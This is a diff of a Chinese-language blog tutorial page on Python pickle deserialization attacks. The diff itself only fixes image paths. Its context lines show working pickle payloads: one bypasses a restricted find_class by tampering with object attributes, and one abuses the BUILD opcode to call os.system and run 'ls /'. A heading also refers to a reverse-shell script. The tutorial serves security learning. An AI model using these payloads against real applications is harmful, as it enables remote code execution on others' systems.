@@ -210,10 +210,6 @@ test <span class="token operator">=</span> pickle<span class="token punctuation"
 <span class="token keyword">print</span> test
 pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span></code></pre>
 <p>执行结果</p>
-<img src="/2020/12/31/Python反序列化/image-20210104225654282.png" srcset="/img/loading.gif" title="image">
-
-
-
 <p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210104225654282.png" srcset="/img/loading.gif" alt="image-20210104225654282"></p>
 <p>反弹shell脚本</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
@@ -305,7 +301,7 @@ platform<span class="token punctuation">.</span>popen<span class="token punctuat
 <span class="token comment" spellcheck="true">#payload</span>
 gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUKdWIu</code></pre>
 <p>输出成功</p>
-<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5Chexo%5Csource_posts%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105112753274.png" srcset="/img/loading.gif" alt="image-20210105112753274"></p>
+<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105112753274.png" srcset="/img/loading.gif" alt="image-20210105112753274"></p>
 <h3 id="绕过c指令module限制"><a href="#绕过c指令module限制" class="headerlink" title="绕过c指令module限制"></a>绕过<code>c</code>指令<code>module</code>限制</h3><p>上面知道c指令码通过引用find_class实现功能，而find_class是可以被重写的。如果和下面的代码一样，重写的类中只允许c指令包含<strong>main</strong>这一个module：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
 <span class="token keyword">import</span> test
@@ -355,9 +351,9 @@ gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUK
 <p>payload</p>
 <pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\ntest\n}(Vname\nV123\nVdate\nV456\nub0c__main__\nStu\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00123X\x04\x00\x00\x00dateX\x03\x00\x00\x00456ub.'</span></code></pre>
 <p>篡改后的序列化字符串格式</p>
-<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5Chexo%5Csource_posts%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105140019864.png" srcset="/img/loading.gif" alt="image-20210105140019864"></p>
+<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105140019864.png" srcset="/img/loading.gif" alt="image-20210105140019864"></p>
 <p>传入编码后的payload，可以看到输出success。此时test.name和test.date的值是123和456。</p>
-<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5Chexo%5Csource_posts%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105140708010.png" srcset="/img/loading.gif" alt="image-20210105140708010"></p>
+<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105140708010.png" srcset="/img/loading.gif" alt="image-20210105140708010"></p>
 <h3 id="不用reduce的RCE方法"><a href="#不用reduce的RCE方法" class="headerlink" title="不用reduce的RCE方法"></a>不用reduce的RCE方法</h3><p>这里利用的是b指令码。b指令码用来更新对象的属性。</p>
 <pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
         stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack
@@ -389,7 +385,7 @@ gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUK
 <p>payload</p>
 <pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'</span></code></pre>
 <p>命令执行成功。</p>
-<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5Chexo%5Csource_posts%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105171408311.png" srcset="/img/loading.gif" alt="image-20210105171408311"></p>
+<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105171408311.png" srcset="/img/loading.gif" alt="image-20210105171408311"></p>
 <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>pker</p>
 <p><a href="https://github.com/eddieivan01/pker" target="_blank" rel="noopener">https://github.com/eddieivan01/pker</a></p>
 <p>参考：<a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/</a></p>
